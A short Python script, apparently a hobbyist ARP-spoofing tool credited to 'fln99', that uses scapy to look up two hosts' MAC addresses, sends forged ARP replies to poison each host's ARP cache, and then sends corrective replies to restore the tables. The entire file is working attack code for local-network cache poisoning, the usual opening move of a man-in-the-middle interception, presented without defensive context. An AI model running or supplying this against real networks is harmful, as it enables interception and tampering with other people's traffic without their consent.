import sys

from scapy.layers.l2 import ARP
from scapy.sendrecv import sr1, send

def get_mac_address(ip_address):
    packet = ARP(op=1, pdst=ip_address)
    response = sr1(packet, verbose=False)
    return response.hwsrc


def spoof(victim_ip, spoofed_device_ip):
    packet = ARP(op=2, psrc=spoofed_device_ip, pdst=victim_ip)
    send(packet, verbose=False)


def restore_arp_table(victim_ip, victim_mac, spoofed_device_ip):
    packet = ARP(op=2, psrc=victim_ip, hwsrc=victim_mac, pdst=spoofed_device_ip)
    for _ in range(4):
        send(packet, verbose=False)


banner = """ _  _  _  __ _       _    \n|_||_)|_)(_ |_)_  __|__ __\n| || \|  __)| (_)(_)|(/_| by fln99\n"""

if __name__ == "__main__":
    victim = sys.argv[1]
    spoofed_device = sys.argv[2]
    original_victim_mac = get_mac_address(victim)
    original_spoofed_device_mac = get_mac_address(spoofed_device)

    print(banner)

    print("[+] Sending spoofed packets...")
    spoof(victim, spoofed_device)
    spoof(spoofed_device, victim)

    print("[.] Restoring ARP tables...")
    restore_arp_table(victim, original_victim_mac, spoofed_device)
    restore_arp_table(spoofed_device, original_spoofed_device_mac, victim)
    print("[+] ARP tables restored!")